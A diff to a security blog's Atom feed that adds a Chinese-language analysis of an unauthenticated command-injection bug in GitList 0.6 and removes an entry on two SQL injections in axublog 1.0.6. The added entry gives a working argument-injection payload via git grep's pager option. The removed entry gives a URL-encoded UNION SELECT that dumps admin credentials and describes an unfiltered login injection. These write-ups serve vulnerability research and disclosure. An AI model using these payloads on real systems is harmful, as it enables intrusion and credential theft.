@@ -225,6 +225,66 @@
   </entry>
   
   <entry>
+    <title>GitList 0.6 Unauthenticated RCE 分析</title>
+    <link href="http://chybeta.github.io/2018/04/30/GitList-0-6-Unauthenticated-RCE-%E5%88%86%E6%9E%90/"/>
+    <id>http://chybeta.github.io/2018/04/30/GitList-0-6-Unauthenticated-RCE-分析/</id>
+    <published>2018-04-30T04:25:26.000Z</published>
+    <updated>2018-05-01T12:14:53.243Z</updated>
+    
+    <content type="html"><![CDATA[<p>GitList 0.6 Unauthenticated RCE 分析<br><a id="more"></a></p>
+<h1 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h1><p>Gitlist 0.6 下载地址： <a href="https://github.com/klaussilveira/gitlist/releases/download/0.6.0/gitlist-0.6.0.tar.gz" target="_blank" rel="external">https://github.com/klaussilveira/gitlist/releases/download/0.6.0/gitlist-0.6.0.tar.gz</a></p>
+<p>解压出来后，将其中的config.ini-example重命名为config.ini，并将其中第四行修改指向repo的地址，以我为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">repositories[] = &apos;/home/chybeta/test/&apos;</div></pre></td></tr></table></figure></p>
+<p>在<code>test</code>目录下建立repo：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mkdir gitlist_rce</div><div class="line">cd gitlist_rce</div><div class="line">echo &quot;chybeta&quot; &gt; README.md</div><div class="line">git init</div><div class="line">git add *</div><div class="line">git commit -m &quot;gitlist_rce&quot;</div></pre></td></tr></table></figure></p>
+<p>其余问题，可以直接参考<a href="https://www.sitepoint.com/installing-gitlist-for-local-repos/" target="_blank" rel="external">Installing GitList for Local Reposs</a></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/1.png?raw=true" alt=""></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在 gitlist/src/Controller/TreeController.php:51行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span></div><div class="line">$route-&gt;post(<span class="string">'&#123;repo&#125;/tree/&#123;branch&#125;/search'</span>, <span class="function"><span class="keyword">function</span> <span class="params">(Request $request, $repo, $branch = <span class="string">''</span>, $tree = <span class="string">''</span>)</span> <span class="title">use</span> <span class="params">($app)</span> </span>&#123;</div><div class="line">    $repository = $app[<span class="string">'git'</span>]-&gt;getRepositoryFromName($app[<span class="string">'git.repos'</span>], $repo);</div><div class="line">    <span class="keyword">if</span> (!$branch) &#123;</div><div class="line">        $branch = $repository-&gt;getHead();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    $query = $request-&gt;get(<span class="string">'query'</span>);</div><div class="line">    $breadcrumbs = [[<span class="string">'dir'</span> =&gt; <span class="string">'Search results for: '</span> . $query, <span class="string">'path'</span> =&gt; <span class="string">''</span>]];</div><div class="line">    $results = $repository-&gt;searchTree($query, $branch);</div><div class="line">...</div></pre></td></tr></table></figure></p>
+<p>当我们在repo中进行搜索时，以搜索字符串”chybeta”为例<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/2.png?raw=true" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">POST /gitlist/gitlist_rce/tree/master/search HTTP/1.1</div><div class="line"></div><div class="line">query=chybeta</div></pre></td></tr></table></figure>
+<p>则对应的变量即为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">repo =&gt; gitlist_rce</div><div class="line">branch =&gt; master</div><div class="line">query =&gt; chybeta</div></pre></td></tr></table></figure></p>
+<p>进入到searchTree函数中，即gitlist/src/Git/Repository.php第320行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">searchTree</span><span class="params">($query, $branch)</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($query)) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        $query = escapeshellarg($query);</div><div class="line"></div><div class="line">        <span class="keyword">try</span> &#123;</div><div class="line">            $results = <span class="keyword">$this</span>-&gt;getClient()-&gt;run(<span class="keyword">$this</span>, <span class="string">"grep -i --line-number &#123;$query&#125; $branch"</span>);</div><div class="line">        &#125; <span class="keyword">catch</span> (\RuntimeException $e) &#123;</div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">        &#125;</div></pre></td></tr></table></figure></p>
+<p><code>query</code>参数经过了<code>escapeshellarg</code>函数的过滤，<a href="http://php.net/manual/zh/function.escapeshellarg.php" target="_blank" rel="external">官方文档</a>:</p>
+<blockquote>
+<p>escapeshellarg()把字符串转码为可以在 shell 命令里使用的参数。 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符.</p>
+</blockquote>
+<p>之后进入run方法，gitlist/vendor/klaussilveira/gitter/lib/Gitter/Client.php:63：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span><span class="params">($repository, $command)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (version_compare(<span class="keyword">$this</span>-&gt;getVersion(), <span class="string">'1.7.2'</span>, <span class="string">'&gt;='</span>)) &#123;</div><div class="line">        $command = <span class="string">'-c "color.ui"=false '</span> . $command;</div><div class="line">    &#125;</div><div class="line">    </div><div class="line">    $process = <span class="keyword">new</span> Process(<span class="keyword">$this</span>-&gt;getPath() . <span class="string">' '</span> . $command, $repository-&gt;getPath());</div><div class="line">    $process-&gt;setTimeout(<span class="number">180</span>);</div><div class="line">    $process-&gt;run();</div></pre></td></tr></table></figure></p>
+<p>在<code>$process = new Process()</code>处最终构成的命令为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/bin/git grep -i --line-number &apos;chybeta&apos; master</div></pre></td></tr></table></figure></p>
+<p>在<a href="https://git-scm.com/docs/git-grep#git-grep---open-files-in-pagerltpagergt" target="_blank" rel="external"><code>git grep</code>命令</a>中提到：</p>
+<blockquote>
+<p>Open the matching files in the pager (not the output of grep). If the pager happens to be “less” or “vi”, and the user specified only one pattern, the first file is positioned at the first match automatically. The pager argument is optional; if specified, it must be stuck to the option without a space. If pager is unspecified, the default pager will be used (see core.pager in git-config[1]).</p>
+</blockquote>
+<p>本意上，这个参数的作用是可以选择pager，比如less或者vi，在查找到匹配的文件后使用指定的pager打开。比如匹配到的文件是README.md，则相当于执行<code>vi READEME.md</code>或<code>less README.md</code>。但倘若我们指定<code>--open-files-in-pager=id;</code>，注意有一个<code>;</code>，则在匹配到文件后，则相当于执行<code>id; README.md</code>，在unix中分号表示顺序的执行各条命令而不关心是否失败。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/3.png?raw=true" alt=""></p>
+<p>不过在执行之前经过了<code>escapeshellarg</code>，会在字符串两边加上单引号，这会有影响吗？不会。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/4.png?raw=true" alt=""></p>
+<p>所以当构造如下的数据包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">POST /gitlist/gitlist_rce/tree/c/search HTTP/1.1</div><div class="line"></div><div class="line">query=--open-files-in-pager=touch /tmp/test/chybeta</div></pre></td></tr></table></figure></p>
+<p>注意修改了<code>tree/master/search</code> 为<code>tree/c/search</code>，也即使<code>branch</code>值为<code>c</code>，这样拼接出来的最后的语句即为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/usr/bin/git grep -i --line-number &apos;--open-files-in-pager=touch /tmp/test/chybeta&apos; c</div></pre></td></tr></table></figure></p>
+<p>当进行查找时，由于READEME.md（内容为chybeta）中含有字符<code>c</code>，因此可以查找成功，之后由于注入参数的关系，将会执行<code>touch /tmp/test/chybeta</code>，将会在/tmp/test/目录下创建一个新的文件。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180501/5.png?raw=true" alt=""></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://xz.aliyun.com/t/2315" target="_blank" rel="external">谈escapeshellarg绕过与参数注入漏洞</a></li>
+<li><a href="https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html" target="_blank" rel="external">Exploit/bypass PHP escapeshellarg/escapeshellcmd functions</a></li>
+<li><a href="http://hatriot.github.io/blog/2014/06/29/gitlist-rce/" target="_blank" rel="external">Gitlist - Commit to Rce</a></li>
+<li><a href="https://www.sitepoint.com/installing-gitlist-for-local-repos/" target="_blank" rel="external">Installing GitList for Local Reposs</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;GitList 0.6 Unauthenticated RCE 分析&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
+    
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+      <category term="gitlist" scheme="http://chybeta.github.io/tags/gitlist/"/>
+    
+  </entry>
+  
+  <entry>
     <title>Spring Data Commons Remote Code Execution 分析-【CVE-2018-1273】</title>
     <link href="http://chybeta.github.io/2018/04/11/Spring-Data-Commons-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1273%E3%80%91/"/>
     <id>http://chybeta.github.io/2018/04/11/Spring-Data-Commons-Remote-Code-Execution-分析-【CVE-2018-1273】/</id>
@@ -610,9 +670,9 @@
     
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
+    
+      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
       <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
     
@@ -1013,9 +1073,9 @@
     
       <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
-      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
       <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
+    
+      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
       <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
     
@@ -1598,48 +1658,6 @@ $output .= &quot;if ({$dec}) {\n&quot;;
       <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
     
       <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>axublog v1.0.6 两处sql注入分析</title>
-    <link href="http://chybeta.github.io/2017/12/26/axublog-v1-0-6-%E4%B8%A4%E5%A4%84sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
-    <id>http://chybeta.github.io/2017/12/26/axublog-v1-0-6-两处sql注入分析/</id>
-    <published>2017-12-26T08:23:22.000Z</published>
-    <updated>2017-12-26T09:30:56.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>继续水一水，把以前随手看的发上来。</p>
-<a id="more"></a>
-<h1 id="axublog"><a href="#axublog" class="headerlink" title="axublog"></a>axublog</h1><p>下载地址：<a href="http://www.axublog.com/post/axublog_jian_zhan_xi_tong_update_download/#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80" target="_blank" rel="external">http://www.axublog.com/post/axublog_jian_zhan_xi_tong_update_download/#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80</a></p>
-<h1 id="sql注入一：hit-php"><a href="#sql注入一：hit-php" class="headerlink" title="sql注入一：hit.php"></a>sql注入一：hit.php</h1><p>hit.php的代码量较小，这里直接贴出来：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">header(<span class="string">"Content-type:text/html; charset=utf-8"</span>);</div><div class="line"><span class="keyword">require</span>(<span class="string">"cmsconfig.php"</span>);</div><div class="line"><span class="keyword">require</span>(<span class="string">"class/c_other.php"</span>);</div><div class="line">sqlguolv();</div><div class="line"></div><div class="line">$g=$_GET[<span class="string">'g'</span>];</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($g==<span class="string">'arthit'</span>)&#123;</div><div class="line">	$id=$_GET[<span class="string">'id'</span>];</div><div class="line">	<span class="keyword">if</span>($id!=<span class="string">''</span>)&#123;   </div><div class="line">		$tab=$tabhead.<span class="string">"arts"</span>;</div><div class="line">		mysql_select_db($tab);</div><div class="line">		$sql=mysql_query(<span class="string">"UPDATE "</span>.$tab.<span class="string">" SET hit=hit+1 where id="</span>.$id);</div><div class="line">		$sql = mysql_query(<span class="string">"select * from "</span>.$tab.<span class="string">" where id="</span>.$id);</div><div class="line">		$row=mysql_fetch_array($sql);</div><div class="line">	    $str=$row[<span class="string">'hit'</span>];</div><div class="line">	    <span class="keyword">echo</span> <span class="string">'document.write('</span>.$str.<span class="string">');'</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>其中sqlguolv()函数定义在 <code>class\c_other.php</code>的第545行左右：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Function sqlguolv() &#123;</div><div class="line">		@header(&quot;Content-type:text/html; charset=utf-8&quot;);</div><div class="line">if (preg_match(&apos;/select|insert|update|delete|\&apos;|\\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/i&apos;,$_SERVER[&apos;QUERY_STRING&apos;])==1 or preg_match(&apos;/select|insert|update|delete|\&apos;|\\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/i&apos;,file_get_contents(&quot;php://input&quot;))==1)&#123;echo &quot;警告 非法访问！&quot;;    exit;&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>不过由于程序没有考虑到编码的问题，因此可以对某些关键字进行url编码进行绕过。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171226/1.jpg?raw=true" alt=""></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171226/2.jpg?raw=true" alt=""></p>
-<p>结合表的结构，可以构造出以下payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:2500/axublog/axublog1.0.6install/hit.php?g=arthit&amp;id=0+uni%6fn+s%65l%65ct+1,1,1,1,1,1,group_concat(id,0x3c62723e,adnaa,0x3c62723e,adpss,0x3c62723e),1,1,1,1,1+fro%6d+axublog_adusers</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171226/3.jpg?raw=true" alt=""></p>
-<h1 id="sql注入二：ad-login-php"><a href="#sql注入二：ad-login-php" class="headerlink" title="sql注入二：ad/login.php"></a>sql注入二：ad/login.php</h1><p>填写用户名和密码后，点击提交，会访问<code>login.php?g=jsloginpost</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">..</div><div class="line">@$user=$_POST[<span class="string">"user"</span>];</div><div class="line">@$psw=$_POST[<span class="string">"psw"</span>];</div><div class="line">@$loginlong=$_POST[<span class="string">"loginlong"</span>];</div><div class="line"></div><div class="line">@$g=$_GET[<span class="string">"g"</span>];</div><div class="line">    <span class="keyword">switch</span> ($g)</div><div class="line">    &#123;</div><div class="line">    <span class="keyword">case</span> <span class="string">"jsloginpost"</span>:jsloginpost();<span class="keyword">break</span>;</div><div class="line">    <span class="keyword">case</span> <span class="string">"exit"</span>:loginexit();<span class="keyword">break</span>;</div><div class="line">	<span class="keyword">default</span>:index();<span class="keyword">break</span>;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
-<p>第84行左右：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">...</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">jsloginpost</span><span class="params">()</span></span>&#123;</div><div class="line"><span class="keyword">global</span> $tabhead;</div><div class="line"><span class="keyword">global</span> $txtchk;</div><div class="line">@$user=$_POST[<span class="string">"user"</span>];</div><div class="line">@$psw=$_POST[<span class="string">"psw"</span>];$psw = authcode(@$psw, <span class="string">'ENCODE'</span>, <span class="string">'key'</span>,<span class="number">0</span>);</div><div class="line">@$loginlong=$_POST[<span class="string">"loginlong"</span>];</div><div class="line"></div><div class="line">setcookie(<span class="string">"lggqsj"</span>,date(<span class="string">'Y-m-d H:i:s'</span>,time()+$loginlong), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>,<span class="string">"/; HttpOnly"</span> , <span class="string">""</span>,<span class="string">''</span>);</div><div class="line"></div><div class="line">$tab=$tabhead.<span class="string">"adusers"</span>;</div><div class="line">$chk=<span class="string">" where adnaa='"</span>.$user.<span class="string">"' and adpss='"</span>.$psw.<span class="string">"' "</span>;</div><div class="line">mysql_select_db($tab);</div><div class="line">$sql = mysql_query(<span class="string">"select * from "</span>.$tab.$chk);</div><div class="line"><span class="keyword">if</span>(!$sql)&#123;$jieguo=<span class="string">"&lt;div id=redmsg&gt;(数据库查询失败!)&lt;/div&gt;"</span>;&#125;<span class="keyword">else</span>&#123;</div><div class="line">	$num=mysql_num_rows($sql);</div><div class="line">				<span class="keyword">if</span>($num==<span class="number">0</span>)&#123;$jieguo=<span class="string">'&lt;div id=redmsg&gt;登录失败：账户或密码错误！&lt;/div&gt;'</span>;&#125;</div><div class="line">				<span class="keyword">else</span>&#123;</div><div class="line">loginpass($loginlong);</div><div class="line">				$jieguo=<span class="string">'&lt;div id=bluemsg&gt;登录成功！正在前往&lt;a href="index.php"&gt;后台&lt;/a&gt;。。。&lt;/div&gt;&lt;meta http-equiv="refresh" content="1;url=index.php"&gt;'</span>;</div><div class="line">				@$chkmoblie=isMobile();</div><div class="line">				<span class="keyword">if</span>($chkmoblie==<span class="number">1</span>)&#123;$jieguo=<span class="string">'&lt;div id=bluemsg&gt;登录成功！正在前往&lt;a href="wap.php"&gt;后台&lt;/a&gt;。。。&lt;/div&gt;&lt;meta http-equiv="refresh" content="1;url=wap.php"&gt;'</span>;&#125;</div><div class="line">				&#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line">$json_arr = <span class="keyword">array</span>(<span class="string">"jieguo"</span>=&gt;$jieguo);</div><div class="line">$json_obj = json_encode($json_arr);</div><div class="line"><span class="keyword">echo</span> $json_obj;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>所以可以惊奇的发现，这里没有任何过滤，单引号也没有，啥都没有。。。。</p>
-<p>为方便，我加了一句<code>echo $chk;</code></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20171226/4.jpg?raw=true" alt=""></p>
-<p>登陆成功。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;继续水一水，把以前随手看的发上来。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="sql注入" scheme="http://chybeta.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
